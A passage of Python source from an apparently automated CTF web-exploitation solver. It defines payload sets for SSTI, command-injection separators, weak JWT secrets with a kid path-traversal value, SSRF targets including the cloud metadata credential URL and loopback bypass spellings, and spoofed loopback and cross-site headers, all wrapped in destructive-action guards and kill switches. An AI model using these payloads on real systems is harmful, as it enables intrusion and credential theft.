    "smarty": ("{$@V@}", "{@V@}"),
    "velocity": ("$@V@", "${@V@}"),               # Velocity $ref
}
# Candidate named variables, best first (`objective` is the day-10 field name); the clues/prompt may name more.
SSTI_VARS = ("objective", "flag", "proof", "secret", "author", "message", "data", "content", "result", "note")
SSTI_VAR_READS = 8         # named variables tried per confirmed syntax (the clue/prompt-derived names first)
SSTI_PARAMS = 3             # parameters tried for SSTI per target
SSTI_FILES = 3              # files read through a confirmed template (the prompt's paths first)
CMDI_WORDS = ("host", "hostname", "ip", "ipaddr", "ip_address", "ipaddress", "addr", "address", "domain",
              "target", "dns", "server", "nslookup", "ping", "dig", "whois", "lookup", "traceroute", "resolve",
              "fqdn")
LOOKUP_TEXT = re.compile(r"(?i)\b(?:ping|nslookup|dig|whois|traceroute|dns lookup|host lookup|lookup|resolve)\b")
# `path` is intentionally NOT added to CMDI_WORDS: it is overwhelmingly a file/LFI parameter.  The one narrow
# exception is `_cmdi_clue_path_prefix`, where the target advertises it as the input of its own feature route and
# the target's clue/error/safe-example response independently establishes command execution semantics.
CMDI_CLUE_PATH = "path"
CMDI_SURFACE_TEXT = re.compile(
    r"(?i)\b(?:command(?:[ _-](?:injection|runner|worker|completed|failed|required))?|os[ _-]command|"
    r"shell(?:[ _-](?:command|runner|execution))?|stdout|stderr|worker[ _-]command|"
    r"diagnostic[ _-](?:failed|runner|command)|exec(?:ution)?[ _-](?:completed|failed|result))\b")
CMDI_SAFE_EXAMPLE = re.compile(r"/[A-Za-z0-9_./\-]{1,159}")
# (name, template): {c} is the command (solvers/toolkits/web_exploit.py's separators; `||`, `&` and %0a left out)
CMDI_SEPARATORS = (("semicolon", ";{c}"), ("pipe", "|{c}"), ("and", "&&{c}"), ("newline", "\n{c}"),
                   ("dollar", "$({c})"), ("backtick", "`{c}`"))
CMDI_CONTEXTS = (("bare", "", ""), ("single", "'", "'"), ("double", '"', '"'))
CMDI_PARAMS = 2
CMDI_FILES = 3
JWT_SECRETS = ("secret", "secret123", "secretkey", "secret_key", "supersecret", "s3cr3t", "password", "changeme",
               "changeit", "jwt", "jwtsecret", "jwt_secret", "jwt-secret", "key", "mysecret", "admin", "123456",
               "huntress", "dev", "test", "default", "your-256-bit-secret", "shhhhh", "")
JWT_HASH = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
JWT_KID = "../../../../../../../../dev/null"
JWT_ENDPOINTS = 3
JWT_TOKENS = 2
READ_WORDS = re.compile(r"(?i)(?:^|[/_\-.])(?:admin|administrator|flag|proof|secret|secrets|private|internal|me|"
                        r"profile|account|dashboard|vault|report|reports|whoami|staff|objective|panel)(?=$|[/_\-.?])")
_ROLE_KEYS = ("role", "roles", "group", "groups", "scope", "scopes", "tier", "level", "plan", "type", "user_type",
              "usertype", "account_type", "permission", "permissions", "privilege", "privileges", "access", "rank")
_FLAG_KEYS = ("admin", "is_admin", "isadmin", "is_staff", "staff", "superuser", "is_superuser", "elevated",
              "is_root", "root", "privileged")
_IDENT_KEYS = ("sub", "user", "username", "user_name", "name", "uid", "login", "preferred_username")

# The Day 21 final prep: four more read-only shapes after wave 6 (module text).
SSRF_WORDS = ("url", "uri", "link", "href", "target", "dest", "feed", "fetch", "webhook", "callback", "image", "img",
              "avatar", "proxy", "remote", "endpoint", "site", "resource", "preview")
SSRF_PARAMS = 2             # parameters tried for SSRF per target
SSRF_MAX = 12               # inner URLs per parameter (the baseline not counted)
SSRF_HOP = 12               # second-hop inner URLs per parameter
SSRF_FIXED = ("http://127.0.0.1/", "http://localhost/",
              "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
# Alternate loopback spellings (SSRF bypasses for when 127.0.0.1 is filtered; the Day 22 P1 add; inner_ok admits
# each). Lowest priority: appended only to fill spare budget within SSRF_MAX, never crowding out the prompt's own
# internal URLs or the primaries above.
SSRF_ALT = ("http://127.1/", "http://0x7f000001/", "http://2130706433/", "http://[::1]/")

# The Day-24 clue-driven SSRF class (day-15 "Fetch Quest"; the broken-access class below rides the same wave).
# When /api/clues names a feature_route that answers a `*_required`/`*_missing` error for an absolute URL and a
# secondary_route that is internal-only, the proof comes back from the FEATURE route given the generic SSRF
# param set (url first), each value an internal loopback URL joined with an enumerated internal port and the
# secondary_route path (`feature?url=http://127.0.0.1:<port><secondary_route>`). The pre-Day-24 generic SSRF
# wave (wave 7) only sent `?url=` against the SECONDARY route and never enumerated these ports, so it never
# formed the winning combo (challenges/day-15/.../notes-helper.md). GET only, the feature route driven
# `trusted=True` (an ADVERTISED route, so a destructive WORD in its name does not refuse it; no guessed path is
# ever trusted and the destructive-verb guard is not relaxed anywhere else). The one-proof/payoff rule still
# decides, so a proof the site shows on a plain page, or a second proof-like value, stays None.
SSRF_FEATURE_PARAMS = ("url", "uri", "target", "dest", "link", "fetch", "feed", "remote", "endpoint", "resource")
SSRF_PORTS = ("8080", "5000", "8000", "3000", "80")   # internal ports enumerated on the loopback host
SSRF_FEATURE_MAX = 24          # GETs this reader sends before giving up (the winning case is the first few)
_URL_REQUIRED = re.compile(r"(?i)(?:absolute_?url|url|uri|href|link|fetch|remote|endpoint|resource)[a-z_]*?_"
                           r"(?:required|missing|needed|expected|invalid)")
# The Day-27 clue-driven SSRF->IDOR chain (day-27 "Internal Affairs"; B-234). /api/clues names a feature_route
# that is a GET SSRF whose sink is a QUERY PARAMETER (not a POST body, and the error word is `target_required`,
# which _URL_REQUIRED above deliberately does not match), the caller's own `current_role`, a `topology_route`
# that hands out an internal loopback case-service base URL, and a `case_directory_route` that lists case
# objects with an `owner`. The internal service trusts whoever reached it, so nesting the case id of an owner
# that is NOT current_role inside the SSRF target (`feature?target=http://127.0.0.1:<port><svc>?id=<victim>`)
# reads a record the caller is not authorised to see, and that record carries the proof. GET only; the feature
# and the clue-named recon routes are driven `trusted=True`; the inner URL passes inner_ok(); the one-proof/
# payoff rule still decides (challenges/day-27/.../notes; the day-27 writeup). Default param `target`, default
# recon routes /api/topology and /api/cases when the clue does not name differently-spelled ones.
SSRF_IDOR_INNER_FORMS = ("id", "path", "case")   # how the victim id is nested in the internal service URL
SSRF_IDOR_VICTIMS = 4          # distinct owner-mismatch object ids tried
SSRF_IDOR_MAX = 18             # GETs this chain sends before giving up (the winning case is the first few)
SSRF_IDOR_OWNER_KEYS = ("owner", "owner_role", "owned_by", "role", "user")
SSRF_IDOR_ID_KEYS = ("id", "case_id", "case", "object_id", "record_id")
# The broken-access-control field+action authz bypass (day-14 "The API Has Opinions"): the inventory/clues JSON
# advertises a feature_route plus query parameters, a fields list, an actions list and a protected_reference; the
# privileged field+action combo on the protected reference self-proves. Layer 1's generic hunt refused the
# /execute-/process- feature routes for their destructive WORD, so it never drove them
# (challenges/day-14/.../notes-agent2.md). GET only; the ADVERTISED route is driven `trusted=True` WITHOUT
# relaxing the destructive-verb guard (an action VALUE whose word changes state is still never sent).
ACCESS_FIELDS_MAX = 6          # fields iterated
ACCESS_ACTIONS_MAX = 6         # actions iterated (only read-only action words, see access_action_ok)
# B-235: the action VALUE guard is an allowlist, not the generic destructive blocklist. The blocklist
# (`is_destructive`) misses many state-changing verbs (publish, grant, promote, assign, rename, set, enable...),
# so the access matrix sends an advertised action only when EVERY word of it is a read-only verb or a
# read-only modifier below, AND `is_destructive` does not flag the value (checked in `access_action_ok`, so a
# later edit that puts a destructive word in either set is still refused). An unknown verb is skipped and
# recorded in `refused` ("access-action:<value>"), never sent: narrowing the route-NAME refusal for an
# advertised route (trusted) is paired with tightening what may ride on it.
# Deliberately NOT on the list, though they read like reads: "report" (in CTF apps it usually hands a URL to
# an admin bot or files a ticket), "open" and "load" (open or load a session, file, job or workflow), "audit"
# (often starts an audit run or writes an entry) and "check" (check-out/check-in, or a health-check trigger).
ACCESS_READ_VERBS = frozenset({
    "view", "read", "get", "show", "list", "export", "download", "preview", "print", "render", "display",
    "inspect", "summary", "summarize", "describe", "fetch", "dump", "query",
    "search", "lookup", "detail", "details", "info", "peek", "browse", "see", "retrieve",
    "status", "history", "stat", "stats", "count", "raw", "explain", "trace", "debug", "metadata",
})
ACCESS_READ_MODIFIERS = frozenset({
    "all", "full", "raw", "csv", "json", "xml", "pdf", "txt", "text", "html", "yaml", "only", "as", "and",
    "meta", "metadata", "summary", "detail", "details", "public", "private", "internal", "admin",
    "v1", "v2", "v3", "file", "data", "record", "records", "field", "fields", "item", "items", "one",
})
# A `<a>_<b>_<c>_required`/`_missing` error token names several GET parameters at once (Day 14's bare GET of the
# feature route answered 400 `id_fields_action_required`; the pre-B-235 parser joined it into one name,
# `idfieldsaction`). `required_params` splits it; the access reader uses the split only when neither the clue
# nor the inventory document names the query parameters.
_REQUIRED_TOKEN = re.compile(r"\b([a-z][a-z0-9]*(?:_[a-z][a-z0-9]*)+)_(?:required|missing|needed|expected)\b")


def required_params(text):
    """The parameter names one `<a>_<b>..._required` error token names, split on `_`, in order, or ().

    Several tokens, or one whose parts repeat, are ambiguous and give (). Bounded: the first 4 KiB, 2..6 parts.
    """
    tokens = list(dict.fromkeys(_REQUIRED_TOKEN.findall(str(text or "")[:4096].lower())))
    if len(tokens) != 1:
        return ()
    parts = tuple(p for p in tokens[0].split("_") if p)
    if not 2 <= len(parts) <= 6 or len(set(parts)) != len(parts):
        return ()
    return parts


def access_action_ok(action):
    """True only for an action VALUE every word of which is a read-only verb/modifier, with at least one
    read-only verb, that `is_destructive` does not flag either (B-235's allowlist guard, layered on
    `is_destructive` and strictly tighter: an encoded or unknown word is simply not on the list, and a
    destructive word that ever lands on the list is still refused)."""
    if not isinstance(action, str) or not action or len(action) > 64:
        return False
    camel = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", action)
    words = [w for w in re.split(r"[^A-Za-z0-9]+", camel.lower()) if w]
    if not words:
        return False
    return (all(w in ACCESS_READ_VERBS or w in ACCESS_READ_MODIFIERS for w in words)
            and any(w in ACCESS_READ_VERBS for w in words)
            and not is_destructive(action))


def access_authz_enabled():
    """The access class's kill switch: CTF_WEB_ACCESS_AUTHZ=off (or `_access_authz.off` in the event workdir).
    GET-only and read-only, so DEFAULT ON like SSTI; read at call time so an operator can flip it mid-event."""
    return _web_class_on("CTF_WEB_ACCESS_AUTHZ", default=True, file_name="access_authz")


def _exploit_classes():
    """solvers/web/exploit_classes.py (the Day-23 breadth build), loaded by path like _web_exploit() in
    exploit_classes.py itself: it sits beside this file, so a package import is never needed. Returns None
    if the file cannot be read (nothing in this module ever depends on it being present)."""
    try:
        import importlib.util
        spec = importlib.util.spec_from_file_location("huntress_exploit_classes", HERE / "exploit_classes.py")
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return mod
    except Exception:
        return None


def _imds_alt_creds_urls():
    """Full IMDSv1 credential-listing URLs (SSRF_FIXED's own shape) under the metadata IP's whole-integer
    decimal and hex spellings (exploit_classes.imds_ip_encodings(), the Day-23 breadth build): a weak SSRF
    allow-list that string-matches "169.254.169.254" may still let `http://2852039166/...` or
    `http://0xa9fea9fe/...` through. Only the two encodings `internal_host()`'s `_legacy_internal_ip` can
    actually resolve back to the metadata IP are kept (the per-octet octal/hex and IPv6-mapped spellings
    `inner_ok` cannot place yet are left to exploit_classes's own hand-tool use, not claimed here); read-only
    GET, same guard and the same wave (`_ssrf_urls`'s `alt`), off switch EXPLOIT_CLASSES_ENABLED below."""
    ec = _exploit_classes()
    if ec is None:
        return ()
    creds = "/latest/meta-data/iam/security-credentials/"
    out = []
    for enc in ec.imds_ip_encodings():
        if re.fullmatch(r"\d+", enc) or re.fullmatch(r"0x[0-9a-f]+", enc):
            out.append(f"http://{enc}{creds}")
    return tuple(out)


_INNER_URL = re.compile(r"(?i)\b(?:https?)://(?:\[[0-9a-f:.]+\]|[a-z0-9][a-z0-9.\-]*)(?::\d{1,5})?"
                        r"(?![\w.\-])(?:/[^\s\"'<>)\]\\]*)?")
HEADER_PATHS = 3            # 401/403 paths replayed with the loopback headers
CLUE_EXTRA_CONTROLS = 2     # B-236: other advertised *_route values read as proxy-contract controls
LOOPBACK_HEADERS = (("xff", {"X-Forwarded-For": "127.0.0.1"}), ("xrealip", {"X-Real-IP": "127.0.0.1"}),
                    ("xfhost", {"X-Forwarded-Host": "localhost"}))
ROLE_WORDS = ("analyst", "user", "guest", "viewer", "member", "staff")
COOKIE_ENDPOINTS = 3
EXPOSED_PATHS = ("/.env", "/.git/HEAD", "/.git/logs/HEAD", "/.git/config", "/debug", "/debug/vars", "/actuator/env",
                 "/server-status", "/phpinfo.php", "/config.json", "/backup.zip")
PROMPT_ROUTES = 4           # non-file routes the prompt names, GET in wave 2
# A prompt path under one of these is a FILE (read through a reader), never a route of the site.
_FHS_ROOTS = ("run", "etc", "proc", "var", "tmp", "home", "root", "usr", "opt", "srv", "dev", "sys", "bin", "sbin",
              "lib", "lib64", "mnt", "media", "boot")

# ---------------------------------------------------------------------------------------------------------
#  The reference-technique build (READ-ONLY, GET-only payoff shapes AFTER the existing waves; the wave-2 build
#  list, rows 1/3/4/9 of docs/retro/reference-technique-buildlist.md). Reached only when none of the earlier
#  shapes answered and no novel payoff was seen; the proof form, payoff-not-plain, the one-novel-proof
#  rule, the destructive guard, max_requests, the deadline pad and the stop flag are unchanged, and no POST is
#  sent. A value a wave-11 DETECTOR surfaces is NEVER banked -- each of these four shapes reads its proof from
#  an EXPLOIT (payoff) answer; baseline values are subtracted and a second novel proof remains ambiguous.
#   (1) JWT `jwk` header self-signed injection (CVE-2018-0114): jwt_forgeries gains one more forgery row, so it
#       rides the existing wave-5 JWT replay; the attacker key is never a judged answer (see jwt_jwk_forge).
#   (2) Web cache deception (path confusion): a personalized page requested under a static-looking suffix.
_PERSONAL = re.compile(r"(?i)(?:^|[/_\-.])(?:account|accounts|myaccount|profile|me|user|users|dashboard|"
                       r"settings|setting|billing|orders|order|cart|inbox|messages|message|notifications|"
                       r"session|preferences|wallet)(?=$|[/_\-.?])")
CACHE_BASES = 3            # personalized pages tried for cache deception (path confusion)
#   (3) GraphQL auto field-read over GET (+ field-suggestion enum): reads a Query-root field over GET.
GQL_ENDPOINTS = ("/graphql", "/api/graphql", "/graphiql", "/graphql/console", "/v1/graphql", "/query/graphql")
GQL_MAX_ENDPOINTS = 2     # GraphQL endpoints probed per target
GQL_FIELDS = 12           # Query-root fields auto-read over GET per endpoint
GQL_SUBFIELDS = 8         # scalar subfields read from one object-returning field
#   (4) 401/403 path-normalization bypass: the access wave's PATH half (the header half is _header_items).
BYPASS_PATHS = 3          # 401/403 paths retried with normalized spellings
BYPASS_MAX = 14           # normalized spellings tried per denied path

# The clue-field-driven GET classes (day-06 browser callback, day-08 session fixation; backlog rows 447/469/471).
# /api/clues discloses the routes and a nonce or a session hint; the request PARAMETER names are derived from the
# clue field (never a single hard-coded ?sid= or ?nonce=). A short known list seeds the candidates, so the common
# real name is tried first, and the stem of the clue key and the route's own error word are added for odd variants.
SESSION_PARAMS = ("sid", "session", "session_id", "sessionid", "sess", "s", "token")
NONCE_PARAMS = ("nonce", "token", "cb", "callback", "code")
STORED_XSS_POLLS = 15       # GETs of the note page while the moderator browser runs the stored payload
STORED_XSS_POLL_GAP = 1.0   # seconds between polls (also bounded by the hunt's deadline)
_NOTE_LIKE = re.compile(r"note|message|feedback|postcard|comment|guestbook|submit|post", re.I)
_XSS_PATH = re.compile(r"^/[A-Za-z0-9._~!$&()*+,;=:@%/\-]{1,1023}$")
_XSS_FATAL_PATH = re.compile(
    r"(?i)(?:^|[/_.-])(?:delete|remove|destroy|reset|logout|signout|drop|wipe|purge|revoke|disable|"
    r"deactivate|truncate|erase|uninstall|kill|shutdown|restart|reboot|ban|suspend|cancel|rollback|"
    r"restore|transfer|pay|approve|reject|exec|execute|command|shell)(?=$|[/_.-]|\d)"
)
# The older clue-driven CSRF/upload chains cross a state boundary.  Their
# observed action names include inspect/execute/upload/submit/dispatch, so the
# broad GET guard cannot be reused verbatim; it would reject the legitimate
# contracts.  These words, however, are never needed by either class and stay
# fatal even when the target advertises them.
_STATEFUL_FATAL_PATH = re.compile(
    r"(?i)(?:^|[/_.-])(?:delete|del|remove|destroy|reset|logout|signout|drop|wipe|purge|revoke|"
    r"disable|deactivate|truncate|erase|uninstall|kill|shutdown|restart|reboot|ban|suspend|cancel|"
    r"rollback|revert|restore|transfer|pay|approve|reject)(?=$|[/_.-]|\d)"
)
CLUE_PARAM_TRIES = 6        # distinct parameter names tried per clue reader (each a real GET; a proof is RETURNED
#                            only when the target actually sent it, never fabricated)
# The headers a same-origin browser fetch() fires from the feature page (the day-06 callback's 403 gate reads them).
BROWSER_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36")
BROWSER_FETCH_HEADERS = {"Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
                         "User-Agent": BROWSER_UA}
def _stored_xss_on():
    # The day-07 stored-XSS class is POST-only (crosses GET-only rule 393). ENABLED by the player's explicit
    # yes of 2026-10-21 ("yes enable the stored-XSS POST class"). Kill-switch: CTF_STORED_XSS=off, or a
    # file challenges/_stored_xss.off (CTF_WORKDIR). One POST, own-host only (the WebClient scope lock),
    # and the proof is banked ONLY from a follow-up GET of the note page, never from the POST response.
    if ctf_env.get("CTF_STORED_XSS", "on").strip().lower() == "off":
        return False
    try:                                # a toggle file in the event workdir; none resolvable = no file
        if (ctf_paths.workdir() / "_stored_xss.off").exists():
            return False
    except Exception:
        pass
    return True


STORED_XSS_ENABLED = _stored_xss_on()


def _web_class_on(env, default, file_name=None):
    """The on/off state of a state-changing web class, the SAME gating shape as _stored_xss_on(): the env var
    `env` (`on`/`off`) wins, then a file under CTF_WORKDIR (`_<name>.on` forces on, `_<name>.off` forces
    off), else `default`. `env` is CTF_WEB_<NAME>, so `<name>` is its last word lowercased (csrf, upload)
    UNLESS `file_name` is given: a caller whose env var's last word is not its documented file stem (a
    multi-word name such as EXPLOIT_CLASSES, whose file is `_exploit_classes.off`, not `_classes.off` --
    the bug this parameter fixes) passes the exact stem it documents. `file_name`'s own `_<stem>.off`/`.on`
    is checked FIRST; the rsplit-derived name is still checked after it for back-compat with any file left
    over under the old (broken) name, so an existing `_classes.off` keeps working too."""
    names = [file_name.lower()] if file_name else []
    rsplit_name = env.rsplit("_", 1)[-1].lower()
    if rsplit_name not in names:
        names.append(rsplit_name)
    v = ctf_env.get(env)
    if v is not None:
        vv = v.strip().lower()
        if vv in ("on", "1", "true", "yes"):
            return True
        if vv in ("off", "0", "false", "no"):
            return False
    try:                                # toggle files in the event workdir; none resolvable = no file
        ch = ctf_paths.workdir()
        for name in names:
            if (ch / f"_{name}.off").exists():
                return False
        for name in names:
            if (ch / f"_{name}.on").exists():
                return True
    except Exception:
        pass
    return default


# The two Day-22 state-changing web classes (day-09 CSRF cross-site forge, day-10 upload->template eval). Both are
# DEFAULT ON under the player's explicit 2026-10-26 request for maximum web coverage. Each remains narrow and
# target-described, changes only the synthetic challenge session's own state, and has an immediate kill switch:
# CTF_WEB_CSRF/UPLOAD=off or challenges/_csrf.off/_upload.off.
CSRF_ENABLED = _web_class_on("CTF_WEB_CSRF", default=True)
UPLOAD_ENABLED = _web_class_on("CTF_WEB_UPLOAD", default=True)

# SSTI (explicit server-side template injection) hardened reader (the day-23 build). It is READ-ONLY: GET only,
# an arithmetic marker confirmed by its COMPUTED product, then a FILE or a NAMED template variable/object is READ;
# nothing runs a command and no state changes. So, unlike the state-changing CSRF/upload classes above, it is
# DEFAULT ON (it clears the same bar the Day-21 speculative SSTI shape already cleared). A parity kill-switch, so
# it CAN still be disabled: CTF_WEB_SSTI=off, or a file challenges/_ssti.off (challenges/_ssti.on forces on).
# When off, _ssti_probes returns [] and the whole SSTI path (waves 5, 6 and 6b) is inert.
SSTI_ENABLED = _web_class_on("CTF_WEB_SSTI", default=True)

# solvers/web/exploit_classes.py (the Day-23 breadth build) wired into this file's existing waves: READ-ONLY,
# GET-only additions (the IMDS alternate encodings above), so DEFAULT ON like SSTI above; CTF_WEB_EXPLOIT_CLASSES
# =off (or challenges/_exploit_classes.off) turns it off (SSRF_ALT then keeps only the four loopback bypasses it
# had before this build). The POST-only classes in that module (XXE, GraphQL, NoSQL) are not fired by this GET-only
# hunter; they stay hand-tool helpers for the web agent, reachable through solvers/toolkits/web.py's lazy
# re-export list EXPLOIT_CLASS_NAMES, exactly as web_exploit.py's and java_deser.py's helpers already are.
EXPLOIT_CLASSES_ENABLED = _web_class_on("CTF_WEB_EXPLOIT_CLASSES", default=True, file_name="exploit_classes")

# the hint parser (ticket W0, this build): reads ONLY parameter name(s) and endpoint spellings the target
# volunteers about itself (parse_clue_hints below), never a new request shape or payload -- a parity change
# for the speculative-shape param order, so DEFAULT ON like SSTI/EXPLOIT_CLASSES above.
# CTF_WEB_CLUE_HINT=off (or challenges/_clue_hint.off) reverts _clue_feature_params to clue_params alone.
CLUE_HINT_PARAMS_ENABLED = _web_class_on("CTF_WEB_CLUE_HINT", default=True, file_name="clue_hint")

# The Day-24 SAFE breadth (wave 9): per-class GET-only / read-only DETECTORS for the classes proof_hunt could
# not otherwise touch -- GraphQL (GET introspection), NoSQLi (a GET-param boolean oracle), XXE (an XML surface,
# offline), prototype pollution (a JSON-merge surface, offline), insecure deserialization (a serialized blob in
# a cookie/param, offline), and JWT RS256/jku confusion (an RS token + a readable public key or a jku header,
# offline). Each RECORDS a finding for the web agent and NEVER banks a proof (the hunt's answer stays None here)
# and NEVER sends a POST. The matching STATE-CHANGING / POST / OOB / write / gadget halves stay HAND TOOLS in
# solvers/web/exploit_classes.py (reachable via solvers/toolkits/web.py), player-gated, never auto-fired: the
# XXE entity read (POST body + OOB exfil), the GraphQL mutation, the NoSQL login-bypass POST, the prototype-
# pollution canary WRITE, the deserialization sleep-gadget/chain, and the jku-hosted-JWKS forge. These detectors
# are DEFAULT ON because they are read-only; each has a parity kill-switch like the flags above:
# CTF_WEB_CLASS_<NAME>=off, or challenges/_class_<name>.off (challenges/_class_<name>.on forces on).
BREADTH_CLASSES = ("graphql", "nosql", "xxe", "proto", "deser", "jwtconf")
EXPLOIT_CLASSES = {
    name: _web_class_on(f"CTF_WEB_CLASS_{name.upper()}", default=True, file_name=f"class_{name}")
    for name in BREADTH_CLASSES
}

# The headers that turn a plain GET into a cross-site top-level navigation (the day-09 CSRF forge): a browser's own
# Sec-Fetch-* for a navigation from another origin plus a foreign Origin/Referer. The request still goes ONLY to the
# in-scope target (these are request headers, not a cross-origin fetch); attacker.example is a dummy name that is
# never contacted (no DNS, no connection) -- it only makes the server read the request as cross-site.
CROSS_SITE_HEADERS = {"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document",
                      "Origin": "https://attacker.example", "Referer": "https://attacker.example/"}

# A PEM public key an RS256/ES256 token could be HS-confused with (web.forge_jwt_hs_confusion).
_PEM_PUBLIC = re.compile(r"-----BEGIN (?:RSA )?PUBLIC KEY-----.+?-----END (?:RSA )?PUBLIC KEY-----", re.S)

# A path, parameter name or offered parameter value whose words change or end state is never requested.
_DESTRUCTIVE = re.compile(
    r"(?i)(?:^|[/_\-.?&=;,+ ])(?:delete|del|remove|rm|destroy|reset|logout|log-out|log_out|signout|"
    r"sign-out|sign_out|logoff|drop|wipe|purge|revoke|disable|deactivate|truncate|flush|clear|erase|"
    r"uninstall|kill|shutdown|restart|reboot|ban|suspend|unregister|cancel|rollback|revert|restore|"
    r"update|transfer|pay|approve|reject|edit|create|insert|upload|import|write|save|submit|exec|"
    r"execute|run|cmd|command|shell|eval)(?=$|[/_\-.?&=;,+ ]|\d)")
# `trusted=True` means only that /api/clues advertised the route.  It may waive
# the narrow historical synthetic action words execute/submit/upload (process,
# inspect and dispatch are not destructive words above); it must never waive a
# genuinely destructive route merely because the target named it.
_TRUSTED_FATAL_PATH = re.compile(
    r"(?i)(?:^|[/_\-.?&=;,+ ])(?:delete|del|remove|rm|destroy|reset|logout|log-out|log_out|signout|"
    r"sign-out|sign_out|logoff|drop|wipe|purge|revoke|disable|deactivate|truncate|flush|clear|erase|"
    r"uninstall|kill|shutdown|restart|reboot|ban|suspend|unregister|cancel|rollback|revert|restore|"
    r"update|transfer|pay|approve|reject|edit|create|insert|import|write|save|exec|run|cmd|command|"
    r"shell|eval)(?=$|[/_\-.?&=;,+ ]|\d)"
)
_ABS_URL = re.compile(
    r"(?i)(?<![A-Za-z0-9+.-])(?:[A-Za-z][A-Za-z0-9+.-]{0,31}:)?//[^\s<>'\"\\{}\[\])]{1,4096}"
)
_ENCODED_ABS_URL = re.compile(
    r"(?i)(?<![A-Za-z0-9%+.-])(?:[A-Za-z][A-Za-z0-9+.-]{0,31}(?::|%3A))?"
    r"(?:(?:/|%2F){2})[^\s<>'\"\\{}\[\])]{1,4096}"
)
_ATTR_URL = re.compile(r"""(?is)\b(?:href|src|action)\s*=\s*(?:"([^"<>]*)"|'([^'<>]*)')""")
_QUOTED_PATH = re.compile(r"""["'](/[A-Za-z0-9_][^"'<>\s]*)["']""")
_TEXT_PATH = re.compile(r"(?<![\w/.:%\-])(/[A-Za-z_][\w\-]*(?:/[\w\-.]+)+)")
_FORM = re.compile(r"(?is)<form\b([^>]*)>(.*?)</form>")
_FIELD = re.compile(r"(?is)<(input|textarea|select)\b([^>]*)>")
_ATTR = re.compile(r"""(?is)\b([a-z\-]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))""")
_ID_KEY = re.compile(r"(?i)(?:^id$|_id$|^id_|[a-z]Id$|^uid$|^oid$)")
_ROUTE_SEG = re.compile(r"^(/[\w\-./]*?[A-Za-z][\w\-]*)/(\d{1,9})/?$")
_ABS_FILE = re.compile(r"(?<![\w.~/-])(/(?:[\w.\-]+/)+[\w.\-]+\.txt)\b")
# Any absolute filesystem path the start's OWN text names (round 2, row 393): any extension or none. It is no
# part of a URL or a word: nothing of a host, a scheme or another path stands right before its first slash.
_PROMPT_PATH = re.compile(r"(?<![\w.~/:%\\-])(/(?:[\w.\-]+/)*[\w.\-]+)")


def prompt_paths(text):
    """(paths, refused): every absolute filesystem path a prompt names, in its order. A path is kept when it
    has two or more segments, or one segment with an extension (`/admin` alone is a route, not a file); a
    `..` segment, or a destructive word in any segment but the FHS directory name `run`, refuses it."""
    keep, refused = [], []
    for m in _PROMPT_PATH.finditer(str(text or "")[:20_000]):
        p = m.group(1).rstrip(".-")
        segs = [s for s in p.split("/") if s]
        if not segs or any(s in (".", "..") for s in segs):
            continue
        if len(segs) < 2 and "." not in segs[-1]:
            continue
        if p in keep or p in refused:
            continue
        if is_destructive("/" + "/".join(s for s in segs if s.lower() != "run")):
            refused.append(p)
        else:
            keep.append(p)
    return keep, refused


def prompt_routes(text):
    """(routes, refused): the absolute paths a prompt names that are no filesystem path (none under /run, /etc,
    /proc, /var, /opt, ...; the Day 21 final prep, item 4), in its order, PROMPT_ROUTES at most. A `..` segment
    is skipped; a destructive word refuses one."""
    keep, refused = [], []
    for m in _PROMPT_PATH.finditer(str(text or "")[:20_000]):
        p = m.group(1).rstrip(".-")
        segs = [s for s in p.split("/") if s]
        if not segs or any(s in (".", "..") for s in segs) or segs[0].lower() in _FHS_ROOTS:
            continue
        if p in keep or p in refused:
            continue
        (refused if is_destructive(p) else keep).append(p)
    return keep[:PROMPT_ROUTES], refused


def clue_params(clue_key, defaults, error_word=None):
    """Ordered GET parameter-name candidates for a clue value, best first and bounded to CLUE_PARAM_TRIES:
    the known `defaults` (the common real names) first, then names DERIVED from this variant's own bytes -- the
    clue key's stem (`session_hint` -> `session`; `callback_nonce` -> `callback`), and the word the feature
    route's own `<word>_required`/`<word>_missing` error names (`session_id_required` -> `session_id`, `sid`).
    So the parameter is read from the clues and the target, never a single hard-coded `?sid=`/`?nonce=`."""
    out = list(defaults)
    key = str(clue_key or "").strip().lower()
    stem = key.rsplit("_", 1)[0] if "_" in key else key
    for c in (stem, stem + "_id", stem + "id", key):
        if c and c not in out:
            out.append(c)
    m = re.search(r"([a-z][a-z0-9_]*?)_(?:required|missing|needed|expected)\b", str(error_word or "").lower())
    if m:
        w = m.group(1)
        for c in (w, w.replace("_", "")) + (("sid",) if w.startswith("session") else ()):
            if c and c not in out:
                out.insert(0, c)
    return list(dict.fromkeys(out))[:CLUE_PARAM_TRIES]


# The hint parser (backlog ticket W0, Day-25 web-16): some targets' /api/clues (or a same-shaped endpoint) STATE
# the parameter to use outright -- `"input_parameter": "path"` -- rather than leaving it to be derived from a
# route's own error wording (clue_params above). Day-16's own clue feed did exactly that and the hunter still
# guessed from its fixed word list and missed `path`. This reads only what the target volunteers about ITSELF:
# no new request shape, no payload, no injection technique -- the explicit name(s) just move to the FRONT of the
# same candidate list `_clue_feature_params` already builds, ahead of clue_params' derived guesses. Never any
# one day's ids: every key below is a common spelling, read generically from whatever JSON object comes back.
# A target naming its clue feed under a different path is read too (_clue_route_candidates below), but only a
# spelling the target's own openapi.json or landing page already names -- never a blind guess at extra paths.
CLUE_INPUT_PARAM_KEYS = ("input_parameter", "input_param", "injectable_parameter", "target_parameter",
                         "query_parameter", "parameter_name", "vulnerable_parameter", "parameter", "param")
CLUE_INPUT_PARAMS_KEYS = ("input_parameters", "injectable_parameters", "target_parameters", "parameters", "params")
CLUE_ROLE_KEYS = ("role", "current_role", "user_role")
CLUE_FRAMEWORK_KEYS = ("framework", "stack", "runtime")
_CLUE_PARAM_NAME = re.compile(r"[A-Za-z_][A-Za-z0-9_]{0,39}")


def _is_clue_param_name(v):
    """A clue-stated parameter name is a bare identifier, never a sentence or a payload: this is the one
    guard between 'the target names its own parameter' and 'the target's text is read as an instruction'."""
